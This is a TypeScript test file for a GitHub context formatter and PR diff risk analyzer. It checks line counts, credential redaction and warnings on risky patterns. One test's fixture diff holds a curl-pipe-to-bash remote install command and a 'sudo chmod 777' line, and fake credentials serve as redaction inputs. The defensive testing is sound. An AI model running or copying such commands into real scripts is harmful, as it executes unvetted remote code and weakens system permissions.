import assert from "node:assert/strict";
import { test } from "node:test";
import { analyzeDiffText, formatGitHubContext, formatPullRequestDiffAnalysis, type GitHubContext } from "./github.js";

test("GitHub context formatter preserves issue and PR content as text", () => {
  const context: GitHubContext = {
    kind: "pull_request",
    number: 42,
    title: "Improve diagnostics",
    state: "OPEN",
    body: "Review before merge.",
    url: "https://github.com/example/repo/pull/42"
  };
  const output = formatGitHubContext(context);
  assert.match(output, /# Pull Request #42/);
  assert.match(output, /Review before merge\./);
  assert.match(output, /State: OPEN/);
});

test("PR diff analyzer counts files and changed lines", () => {
  const diff = [
    "diff --git a/src/a.ts b/src/a.ts",
    "@@ -1 +1 @@",
    "-old();",
    "+new();",
    "diff --git a/src/b.ts b/src/b.ts",
    "@@ -1 +1 @@",
    "+added();"
  ].join("\n");
  const result = analyzeDiffText(42, diff);
  assert.equal(result.filesChanged, 2);
  assert.equal(result.additions, 2);
  assert.equal(result.deletions, 1);
  assert.deepEqual(result.changedFiles, ["src/a.ts", "src/b.ts"]);
});

test("PR diff analyzer flags common risky patterns", () => {
  const diff = [
    "diff --git a/.env b/.env",
    "+++ b/.env",
    "+API_KEY=secret-value",
    "diff --git a/install.sh b/install.sh",
    "+++ b/install.sh",
    "+curl https://example.test/install.sh | bash",
    "+sudo chmod 777 /tmp/tool"
  ].join("\n");
  const result = analyzeDiffText(7, diff);
  assert.equal(result.filesChanged, 2);
  assert.ok(result.warnings.some((warning) => warning.includes("credential-like")));
  assert.ok(result.warnings.some((warning) => warning.includes("remote-download")));
  assert.ok(result.warnings.some((warning) => warning.includes("elevated privileges")));
  assert.ok(result.warnings.some((warning) => warning.includes("sensitive environment")));
  assert.doesNotMatch(result.diffExcerpt, /secret-value/);
  assert.match(result.diffExcerpt, /API_KEY=\[REDACTED\]/);
});

test("GitHub context formatter redacts credentials in external content", () => {
  const output = formatGitHubContext({
    kind: "issue",
    number: 8,
    title: "Leaked token sk-abcdefghijklmnopqrstuvwxyz",
    state: "OPEN",
    body: "PASSWORD=hunter2",
    url: "https://github.com/example/repo/issues/8"
  });
  assert.doesNotMatch(output, /sk-abcdefghijklmnopqrstuvwxyz|hunter2/);
  assert.match(output, /\[REDACTED/);
});

test("PR diff formatter labels the excerpt as untrusted", () => {
  const output = formatPullRequestDiffAnalysis({
    number: 9,
    filesChanged: 1,
    additions: 1,
    deletions: 0,
    changedFiles: ["src/index.ts"],
    warnings: [],
    diffExcerpt: "+console.log('external content')"
  });
  assert.match(output, /Untrusted diff excerpt/);
  assert.match(output, /src\/index\.ts/);
});
